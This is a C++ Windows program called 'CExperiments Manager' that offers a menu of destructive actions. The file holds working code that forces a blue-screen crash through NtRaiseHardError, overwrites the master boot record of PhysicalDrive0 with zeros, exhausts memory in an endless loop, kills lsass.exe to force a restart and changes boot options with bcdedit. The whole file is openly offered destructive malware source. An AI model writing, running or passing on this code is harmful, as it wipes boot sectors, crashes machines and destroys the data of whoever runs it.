#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <fstream>
#include <shellapi.h>
#include <experimental/filesystem>

using std::cout;
using std::endl;
using std::cin;
using std::string;
using std::ofstream;

#define MBR_SIZE 512

typedef NTSTATUS(NTAPI *rtl_RtlAdjustPrivs)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(NTAPI *nt_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);

namespace fs = std::experimental::filesystem;

void CauseBSOD() {
	BOOLEAN isAdmin;
	ULONG resp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	rtl_RtlAdjustPrivs NT_CALL = (rtl_RtlAdjustPrivs)lpFuncAddress;
	nt_NtRaiseHardError NT_CALL2 = (nt_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NT_RETURN = NT_CALL(19, TRUE, FALSE, &isAdmin);
	NT_CALL2(STATUS_ACCESS_VIOLATION, 0, 0, 0, 6, &resp);
}

int main() {
	SetConsoleTitleA("CExperiments Manager\n");
	cout << "Enter number: \n";
	int c;
	cin >> c;

	if (c == 0) {
		cout << "User-mode: \n";
		cout << "1 - Causes BSOD\n";
		cout << "2 - Overwrites MBR\n";
		cout << "3 - Might crash your PC\n";
		cout << "4 - Forces PC to restart by killing system process)\n";
		cout << "5 - A 10K bug\n";
	}

	if (c == 1) {
		CauseBSOD();
	}

	if (c == 2) {
		DWORD dueWrite;
		char mbrData[512];
		SecureZeroMemory(&mbrData, (sizeof mbrData));

		HANDLE hMBR = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
		if (WriteFile(hMBR, mbrData, MBR_SIZE, &dueWrite, NULL)) {
			cout << "MBR is being overwritten...\n";
		}

		else {
			cout << "Are you running program with admin privileges?\n";
		}
		CloseHandle(hMBR);
	}

	if (c == 3) {
		while (true) {
			new string;
			new int;
			new double;
		}
	}

	if (c == 4) {
		//string url = "https://\\.\GLOBALROOT\Device\ConDrv\KernelConnect";
		//ShellExecute(0, "open", url.c_str(), 0, 0, SW_SHOWNORMAL);
		system("taskkill /f /im lsass.exe");
	}

	if (c == 5) {
		system("bcdedit /set optionsedit 1");

	}
	system("pause");
}
